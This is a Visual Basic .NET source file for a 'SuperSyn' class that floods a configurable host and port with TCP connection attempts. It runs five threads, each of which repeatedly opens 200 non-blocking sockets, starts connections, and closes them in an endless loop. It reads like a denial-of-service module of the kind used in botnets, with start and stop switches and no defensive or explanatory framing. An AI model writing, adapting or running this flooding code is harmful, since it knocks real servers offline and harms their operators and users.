Imports System
Imports System.Net
Imports System.Net.Sockets
Imports System.Threading

Friend Class Syn
    Private Shared _floodingJob As ThreadStart()
    Private Shared _floodingThread As Thread()
    Private Shared _ipEo As IPEndPoint
    Private Shared _synClass As SendSyn()
    Public Shared Host As String
    Public Shared IsEnabled As Boolean
    Public Shared Port As Integer = 80
    Public Shared SuperSynSockets As Integer = 200
    Public Shared Threads As Integer = 5

    Public Shared Sub StartSuperSyn()
        Try
            Dim addressList As IPAddress() = Dns.GetHostEntry(Host).AddressList
            _ipEo = New IPEndPoint(addressList(0), Port)
        Catch
            Dim address As IPAddress = IPAddress.Parse(Host)
            _ipEo = New IPEndPoint(address, Port)
        End Try
        _floodingThread = New Thread(Threads - 1) {}
        _floodingJob = New ThreadStart(Threads - 1) {}
        _synClass = New SendSyn(Threads - 1) {}
        For i As Integer = 0 To Threads - 1
            _synClass(i) = New SendSyn(_ipEo, SuperSynSockets)
            _floodingJob(i) = New ThreadStart(AddressOf _synClass(i).Send)
            _floodingThread(i) = New Thread(_floodingJob(i))
            _floodingThread(i).Start()
        Next
        IsEnabled = True
    End Sub

    Public Shared Sub StopSuperSyn()
        For i As Integer = 0 To Threads - 1
            Try
                _floodingThread(i).Abort()
                _floodingThread(i) = Nothing
                _floodingJob(i) = Nothing
                _synClass(i) = Nothing
            Catch
            End Try
        Next
        IsEnabled = False
    End Sub


    Private Class SendSyn
        Private _sock As Socket()
        Private ipEo As IPEndPoint
        Private SuperSynSockets As Integer

        Public Sub New(ByVal ipEo As IPEndPoint, ByVal superSynSockets__1 As Integer)
            Me.ipEo = ipEo
            SuperSynSockets = superSynSockets__1
        End Sub

        Private Shared Sub OnConnect(ByVal ar As IAsyncResult)
        End Sub

        Public Sub Send()
            While True
                Dim num As Integer
                Try
                    _sock = New Socket(SuperSynSockets - 1) {}
                    For num = 0 To SuperSynSockets - 1
                        _sock(num) = New Socket(ipEo.AddressFamily, SocketType.Stream, ProtocolType.Tcp)
                        _sock(num).Blocking = False
                        _sock(num).BeginConnect(ipEo, New System.AsyncCallback(AddressOf OnConnect), _sock(num))
                    Next
                    Thread.Sleep(100)
                    For num = 0 To SuperSynSockets - 1
                        If _sock(num).Connected Then
                            _sock(num).Disconnect(False)
                        End If
                        _sock(num).Close()
                        _sock(num) = Nothing
                    Next
                    _sock = Nothing
                Catch
                    For num = 0 To SuperSynSockets - 1
                        Try
                            If _sock IsNot Nothing Then
                                If _sock(num).Connected Then
                                    _sock(num).Disconnect(False)
                                End If
                                _sock(num).Close()
                                _sock(num) = Nothing
                            End If
                        Catch
                        End Try
                    Next
                End Try
            End While
        End Sub
    End Class

End Class
